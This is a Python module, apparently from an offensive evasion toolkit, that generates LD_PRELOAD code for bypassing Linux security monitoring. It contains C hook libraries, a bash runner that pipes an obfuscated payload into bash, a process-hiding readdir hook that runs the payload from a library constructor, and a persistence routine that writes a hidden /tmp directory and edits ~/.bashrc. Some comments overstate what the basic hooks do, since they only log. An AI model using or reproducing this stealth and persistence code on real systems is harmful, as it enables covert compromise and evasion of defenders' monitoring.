"""
LD_PRELOAD Linux Bypass
Bypasses: Linux security monitoring, library-based detection
Technique: Library preloading and function hooking
"""

import random
import string

class LDPreloadBypass:
    def __init__(self):
        self.hook_functions = ['execve', 'system', 'popen', 'fork']
        self.library_name = 'libhook.so'
    
    def randomize(self):
        """Randomize bypass parameters"""
        self.library_name = f"lib{''.join(random.choices(string.ascii_lowercase, k=6))}.so"
    
    def encode(self, payload):
        """Generate LD_PRELOAD bypass wrapper that preserves obfuscated payload"""
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        # Instead of generating full bypass, just wrap the obfuscated payload
        bypass_wrapper = f'''
# LD_PRELOAD Bypass - Execute with library preloading
export LD_PRELOAD="./libhook.so"
{payload}
unset LD_PRELOAD
'''
        return bypass_wrapper
    
    def _generate_hook_library(self):
        """Generate C library for function hooking"""
        library_code = f'''
// Hook Library - {self.library_name}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

// Original function pointers
static int (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
static int (*orig_system)(const char *command) = NULL;
static FILE *(*orig_popen)(const char *command, const char *type) = NULL;

// Hook execve to bypass monitoring
int execve(const char *pathname, char *const argv[], char *const envp[]) {{
    if (!orig_execve) {{
        orig_execve = dlsym(RTLD_NEXT, "execve");
    }}
    
    // Log bypass attempt
    fprintf(stderr, "[HOOK] execve intercepted: %s\\n", pathname);
    
    // Allow execution
    return orig_execve(pathname, argv, envp);
}}

// Hook system calls
int system(const char *command) {{
    if (!orig_system) {{
        orig_system = dlsym(RTLD_NEXT, "system");
    }}
    
    fprintf(stderr, "[HOOK] system intercepted: %s\\n", command);
    
    // Execute without logging to security tools
    return orig_system(command);
}}

// Hook popen
FILE *popen(const char *command, const char *type) {{
    if (!orig_popen) {{
        orig_popen = dlsym(RTLD_NEXT, "popen");
    }}
    
    fprintf(stderr, "[HOOK] popen intercepted: %s\\n", command);
    
    return orig_popen(command, type);
}}

// Constructor - runs when library loads
__attribute__((constructor))
void init_hooks() {{
    fprintf(stderr, "[HOOK] Library loaded, hooks active\\n");
}}
'''
        return library_code
    
    def _generate_bypass_script(self, payload):
        """Generate bash script for bypass execution"""
        script = f'''
#!/bin/bash
# LD_PRELOAD Bypass Execution Script

# Compile hook library
echo "[+] Compiling hook library..."
gcc -shared -fPIC -o {self.library_name} hook.c -ldl

if [ $? -ne 0 ]; then
    echo "[-] Compilation failed"
    exit 1
fi

# Set up environment
export LD_PRELOAD=./{self.library_name}
echo "[+] LD_PRELOAD set to: $LD_PRELOAD"

# Execute obfuscated payload with hooks active
echo "[+] Executing obfuscated payload..."
echo "{payload}" | bash

# Clean up
unset LD_PRELOAD
rm -f {self.library_name}
echo "[+] Cleanup complete"
'''
        return script
    
    def generate_stealth_variant(self, payload):
        """Generate stealthier variant with process hiding"""
        stealth_code = f'''
// Stealth Hook Library
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

// Hide process from ps/top
static DIR *(*orig_opendir)(const char *name) = NULL;
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

DIR *opendir(const char *name) {{
    if (!orig_opendir) {{
        orig_opendir = dlsym(RTLD_NEXT, "opendir");
    }}
    
    return orig_opendir(name);
}}

struct dirent *readdir(DIR *dirp) {{
    if (!orig_readdir) {{
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }}
    
    struct dirent *entry = orig_readdir(dirp);
    
    // Hide our process
    if (entry && strstr(entry->d_name, "payload") != NULL) {{
        return readdir(dirp); // Skip this entry
    }}
    
    return entry;
}}

// Execute payload
__attribute__((constructor))
void execute_payload() {{
    system("{payload}");
}}
'''
        return stealth_code
    
    def generate_persistence_variant(self, payload):
        """Generate variant with persistence mechanism"""
        persistence_script = f'''
#!/bin/bash
# Persistent LD_PRELOAD Bypass

# Create persistent hook
HOOK_DIR="/tmp/.{random.randint(1000, 9999)}"
mkdir -p $HOOK_DIR
cd $HOOK_DIR

# Generate hook library
cat > hook.c << 'EOF'
{self._generate_hook_library()}
EOF

# Compile
gcc -shared -fPIC -o libhook.so hook.c -ldl

# Add to shell profile for persistence
echo "export LD_PRELOAD=$HOOK_DIR/libhook.so" >> ~/.bashrc

# Execute payload
export LD_PRELOAD=$HOOK_DIR/libhook.so
{payload}
'''
        return persistence_script